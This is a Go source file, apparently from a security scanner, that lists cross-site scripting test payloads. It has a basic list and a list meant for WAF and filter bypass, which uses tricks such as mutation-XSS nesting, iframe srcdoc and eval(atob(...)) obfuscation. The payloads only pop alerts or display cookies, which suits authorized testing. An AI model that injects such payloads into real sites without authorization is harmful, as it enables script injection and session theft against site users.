package techniques

// XSSPayloads for cross-site scripting testing.
var XSSPayloads = []string{
	`<script>alert('XSS')</script>`,
	`"><script>alert('XSS')</script>`,
	`<img src=x onerror=alert('XSS')>`,
	`<svg onload=alert('XSS')>`,
	`javascript:alert('XSS')`,
	`<body onload=alert('XSS')>`,
	`<input onfocus=alert('XSS') autofocus>`,
	`"><img src=x onerror=alert(1)>`,
	`'><script>alert(document.cookie)</script>`,
	`<details open ontoggle=alert('XSS')>`,
}

// XSSAdvancedPayloads for WAF/filter bypass.
var XSSAdvancedPayloads = []string{
	`<svg/onload=alert(1)>`,
	`<img src=x onerror=alert(String.fromCharCode(88,83,83))>`,
	`<script>alert(document.domain)</script>`,
	`"><svg/onload=confirm(1)>`,
	`<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">`,
	`<iframe srcdoc="<script>alert(1)</script>">`,
	"<script>eval(atob('YWxlcnQoMSk='))</script>",
	`<a href="javascript:alert(1)">click</a>`,
	`<div onmouseover="alert(1)">hover me</div>`,
	`${alert(1)}`,
	`{{constructor.constructor('alert(1)')()}}`,
}

// XSSDescription describes the XSS technique.
const XSSDescription = "Cross-Site Scripting - Tests for reflected and stored XSS by injecting script payloads"
